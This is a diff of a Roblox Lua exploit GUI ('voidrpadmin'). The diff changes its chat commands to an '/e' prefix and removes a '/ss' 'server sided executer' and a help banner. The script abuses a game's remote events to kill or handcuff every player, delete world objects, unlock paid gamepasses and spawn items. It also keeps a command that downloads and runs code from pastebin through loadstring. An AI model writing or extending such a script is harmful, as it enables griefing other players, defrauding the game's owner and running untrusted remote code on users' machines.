@@ -44,8 +44,6 @@ local back_2 = Instance.new("TextButton")
 local desc_14 = Instance.new("TextLabel")
 local getkey = Instance.new("TextLabel")
 local desc_15 = Instance.new("TextLabel")
-local ss = Instance.new("TextLabel")
-local desc_16 = Instance.new("TextLabel")
 --Properties:
 voidrpadmin.Name = "voidrpadmin"
 voidrpadmin.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -346,7 +344,7 @@ next.TextWrapped = true
 cmdsmain2.Name = "cmdsmain2"
 cmdsmain2.Parent = voidrpadmin
 cmdsmain2.BackgroundColor3 = Color3.new(0.129412, 0.129412, 0.129412)
-cmdsmain2.BackgroundTransparency = 0.5
+cmdsmain2.BackgroundTransparency = 0.30000001192093
 cmdsmain2.Position = UDim2.new(0.275000006, 0, 0.157000005, 0)
 cmdsmain2.Size = UDim2.new(0, 711, 0, 586)
 cmdsmain2.Visible = false
@@ -596,45 +594,18 @@ desc_15.TextColor3 = Color3.new(1, 1, 1)
 desc_15.TextScaled = true
 desc_15.TextSize = 14
 desc_15.TextWrapped = true
-
-ss.Name = "ss"
-ss.Parent = cmdsmain2
-ss.BackgroundColor3 = Color3.new(1, 1, 1)
-ss.BackgroundTransparency = 1
-ss.Position = UDim2.new(0.0253164545, 0, 0.89249146, 0)
-ss.Size = UDim2.new(0, 200, 0, 50)
-ss.Font = Enum.Font.Code
-ss.Text = "/ss"
-ss.TextColor3 = Color3.new(1, 1, 1)
-ss.TextScaled = true
-ss.TextSize = 14
-ss.TextWrapped = true
-ss.TextXAlignment = Enum.TextXAlignment.Left
-
-desc_16.Name = "desc_16"
-desc_16.Parent = cmdsmain2
-desc_16.BackgroundColor3 = Color3.new(1, 1, 1)
-desc_16.BackgroundTransparency = 1
-desc_16.Position = UDim2.new(0.344585091, 0, 0.8924914, 0)
-desc_16.Size = UDim2.new(0, 451, 0, 50)
-desc_16.Font = Enum.Font.Code
-desc_16.Text = "a server sided executer"
-desc_16.TextColor3 = Color3.new(1, 1, 1)
-desc_16.TextScaled = true
-desc_16.TextSize = 14
-desc_16.TextWrapped = true
 -- Scripts:
-function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands 
+function SCRIPT_NQUM70_FAKESCRIPT() -- voidrpadmin.commands 
 	local script = Instance.new('LocalScript')
 	script.Parent = voidrpadmin
 	game.Players.LocalPlayer.Chatted:connect(function(msg)
-		if msg:match("/kill all") then
+		if msg:match("/e kill all") then
 			for _, v in pairs(game.Players:GetChildren()) do
 				game.Workspace.resources.RemoteEvent:FireServer("dealDamage", v.Character.Humanoid, 100) 
 			end
 		end
 		
-		if msg:match("/cmds") then
+		if msg:match("/e cmds") then
 			script.Parent.cmdsmain.Visible = true
 		end
 		
@@ -644,13 +615,13 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 			end
 		end
 		
-		if msg:match("/cuff all") then
+		if msg:match("/e cuff all") then
 			for _, v in pairs(game.Players:GetChildren()) do
 				game.Workspace.resources.RemoteEvent:FireServer("cuff", v) 
 			end
 		end
 		
-		if msg:match("/fly") then
+		if msg:match("/e fly") then
 			repeat wait() 
 			until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
 		local mouse = game.Players.LocalPlayer:GetMouse() 
@@ -733,7 +704,7 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 		Fly()
 		end
 		
-		if msg:match("/delworkspace") then
+		if msg:match("/e delworkspace") then
 			local rw = workspace.resources.RemoteEvent 
 		 	for i,k in pairs(workspace:GetChildren()) do
 			 	rw:FireServer("toggleShield", k)
@@ -757,7 +728,7 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 		end
 		end)
 		
-		if msg:match("/gamepasses") then
+		if msg:match("/e gamepasses") then
 			workspace.resources.RemoteFunction:InvokeServer("setDataValue", "hasSwat", true)
 			workspace.resources.RemoteFunction:InvokeServer("setDataValue", "hasSpecOps", true)
 			workspace.resources.RemoteFunction:InvokeServer("setDataValue", "hasMerc", true)
@@ -766,7 +737,7 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 		end
 		end
 		
-		if msg:match("/bridge") then
+		if msg:match("/e bridge") then
 				local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
 		tool.RequiresHandle = false
 		tool.Name = "Bridge"
@@ -866,36 +837,32 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 		end
 		end	
 		
-		if msg:match("/tp cell") then
+		if msg:match("/e tp cell") then
 			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-7.601, 4.005, 2.52))
 		end	
 		
-		if msg:match("/tp crims") then
+		if msg:match("/e tp crims") then
 			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-600.986, -27.542, -333))
 		end
 		
-		if msg:match("/tp cake") then
+		if msg:match("/e tp cake") then
 			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(104.693, 1.86, -25.307))
 		end
 		
-		if msg:match("/tp tower") then
+		if msg:match("/e tp tower") then
 			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(192.501, 45.176, -191.497))
 		end
 		
-		if msg:match("/tp police") then
+		if msg:match("/e tp police") then
 			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(92, 1.5, 21))
 		end
 		
-		if msg:match("/btools") then
+		if msg:match("/e btools") then
 			loadstring(game:HttpGet("https://pastebin.com/raw/W5G4V6x4", true))()
 		end
 		
-		if msg:match("/key") then
+		if msg:match("/e key") then
 			game.Workspace.resources.RemoteFunction:InvokeServer("giveItem", "Fake ID Card")
-		end
-		
-		if msg:match("/ss") then
-			loadstring(game:HttpGet("https://pastebin.com/raw/7VL2X0sd", true))()
 		end
 	end)
 	
@@ -917,8 +884,8 @@ function SCRIPT_QAEN81_FAKESCRIPT() -- voidrpadmin.commands
 	
 
 end
-coroutine.resume(coroutine.create(SCRIPT_QAEN81_FAKESCRIPT))
-function SCRIPT_LHGD74_FAKESCRIPT() -- exit.exitscript 
+coroutine.resume(coroutine.create(SCRIPT_NQUM70_FAKESCRIPT))
+function SCRIPT_DQUM77_FAKESCRIPT() -- exit.exitscript 
 	local script = Instance.new('LocalScript')
 	script.Parent = exit
 	script.Parent.MouseButton1Click:Connect(function()
@@ -926,8 +893,8 @@ function SCRIPT_LHGD74_FAKESCRIPT() -- exit.exitscript
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_LHGD74_FAKESCRIPT))
-function SCRIPT_KYNQ66_FAKESCRIPT() -- back.back1 
+coroutine.resume(coroutine.create(SCRIPT_DQUM77_FAKESCRIPT))
+function SCRIPT_FFPW88_FAKESCRIPT() -- back.back1 
 	local script = Instance.new('LocalScript')
 	script.Parent = back
 	script.Parent.MouseButton1Click:Connect(function()
@@ -935,8 +902,8 @@ function SCRIPT_KYNQ66_FAKESCRIPT() -- back.back1
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_KYNQ66_FAKESCRIPT))
-function SCRIPT_HSIT90_FAKESCRIPT() -- next.next1 
+coroutine.resume(coroutine.create(SCRIPT_FFPW88_FAKESCRIPT))
+function SCRIPT_FMAV88_FAKESCRIPT() -- next.next1 
 	local script = Instance.new('LocalScript')
 	script.Parent = next
 	script.Parent.MouseButton1Click:Connect(function()
@@ -945,8 +912,8 @@ function SCRIPT_HSIT90_FAKESCRIPT() -- next.next1
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_HSIT90_FAKESCRIPT))
-function SCRIPT_JTLR65_FAKESCRIPT() -- exit_2.exitscript 
+coroutine.resume(coroutine.create(SCRIPT_FMAV88_FAKESCRIPT))
+function SCRIPT_AUJE76_FAKESCRIPT() -- exit_2.exitscript 
 	local script = Instance.new('LocalScript')
 	script.Parent = exit_2
 	script.Parent.MouseButton1Click:Connect(function()
@@ -954,8 +921,8 @@ function SCRIPT_JTLR65_FAKESCRIPT() -- exit_2.exitscript
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_JTLR65_FAKESCRIPT))
-function SCRIPT_YRJW88_FAKESCRIPT() -- next_2.next2 
+coroutine.resume(coroutine.create(SCRIPT_AUJE76_FAKESCRIPT))
+function SCRIPT_LPXN75_FAKESCRIPT() -- next_2.next2 
 	local script = Instance.new('LocalScript')
 	script.Parent = next_2
 	script.Parent.MouseButton1Click:Connect(function()
@@ -963,8 +930,8 @@ function SCRIPT_YRJW88_FAKESCRIPT() -- next_2.next2
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_YRJW88_FAKESCRIPT))
-function SCRIPT_LZQY89_FAKESCRIPT() -- back_2.back2 
+coroutine.resume(coroutine.create(SCRIPT_LPXN75_FAKESCRIPT))
+function SCRIPT_QGIU87_FAKESCRIPT() -- back_2.back2 
 	local script = Instance.new('LocalScript')
 	script.Parent = back_2
 	script.Parent.MouseButton1Click:Connect(function()
@@ -973,31 +940,4 @@ function SCRIPT_LZQY89_FAKESCRIPT() -- back_2.back2
 	end)
 
 end
-coroutine.resume(coroutine.create(SCRIPT_LZQY89_FAKESCRIPT))
-function SCRIPT_FFSZ68_FAKESCRIPT() -- voidrpadmin.instrucs 
-	local script = Instance.new('LocalScript')
-	script.Parent = voidrpadmin
-	game:GetService("StarterGui"):SetCore("SendNotification", {
-	Title = "Void";
-	Text = "press f9 to see the help";
-	Duration = 1
-	})
-	
-	print([[
-	-----------------------V O I D-----------------------
-	script made by autist69420#9309						-
-														-
-	commands:											-
-														-
-	type /cmds to see the commands						-
-	prefix is /											-
-														-
-	special commands:									-
-														-
-	1. /ss	give you a server sided script executer	    -
-														-
-	------------------------------------------------------
-	]])
-
-end
-coroutine.resume(coroutine.create(SCRIPT_FFSZ68_FAKESCRIPT))
+coroutine.resume(coroutine.create(SCRIPT_QGIU87_FAKESCRIPT))
